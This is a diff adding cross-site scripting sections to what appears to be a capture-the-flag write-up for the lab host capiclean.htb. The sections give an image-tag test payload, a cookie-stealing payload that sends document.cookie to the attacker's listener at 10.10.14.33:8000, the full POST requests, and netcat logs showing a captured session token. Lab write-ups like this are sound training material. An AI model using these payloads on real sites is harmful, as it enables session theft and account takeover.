@@ -263,7 +263,90 @@ by Ben "epi" Risher 🤓                 ver: 2.10.4
 ## Cross Site Scripting
 - Test payload
 ```shell
-<img src="http://10.10.14.33/invalid" onerror=fetch("http://10.10.14.33/XSS")
+<img src="http://10.10.14.33:8000/invalid" onerror=this.src="http://10.10.14.33:8000/">
 ```
 
+Request:
+```shell
+POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+Content-Length: 130
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Origin: http://capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://capiclean.htb/quote
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+service=<img+src%3d"http%3a//10.10.14.33%3a8000/invalid"+onerror%3dthis.src%3d"http%3a//10.10.14.33%3a8000/">&email=pwn%40root.com
+```
+![image](https://github.com/user-attachments/assets/7e8f28dc-78e2-4bc1-883e-f0046b8ba17b)
+
+
+Response:
+```shell
+> rlwrap nc -nlvvkp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.33] from (UNKNOWN) [10.10.11.12] 41222
+GET /invalid HTTP/1.1
+Host: 10.10.14.33:8000
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://127.0.0.1:3000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+ sent 0, rcvd 360
+
+```
+![image](https://github.com/user-attachments/assets/9c5483ab-ba9a-4ce6-9c38-d601838f9d6c)
+
+## Cookie Stealing
+Payload:
+```
+<img src=null onerror=this.src="http://10.10.14.33:8000/?cookie="+document.cookie;>
+```
+
+Request:
+```
+POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+Content-Length: 130
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Origin: http://capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://capiclean.htb/quote
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+service=<img+src%3dnull+onerror%3dthis.src%3d"http%3a//10.10.14.33%3a8000/%3fcookie%3d"%2bdocument.cookie%3b>&email=pwn%40root.com
+```
+![image](https://github.com/user-attachments/assets/b8d1d4cc-43af-4a68-bbbd-864ecf7d8618)
+
+Response:
+```
+> rlwrap nc -nlvvkp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.33] from (UNKNOWN) [10.10.11.12] 36714
+GET /?cookie=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZrPQoQ.5gAlhyN1avk5kwsjPdMzY1Fqb_0 HTTP/1.1
+Host: 10.10.14.33:8000
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://127.0.0.1:3000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+ sent 0, rcvd 462
+```
+![image](https://github.com/user-attachments/assets/16aaf68b-15e7-47c3-a954-592d76c19c81)
 
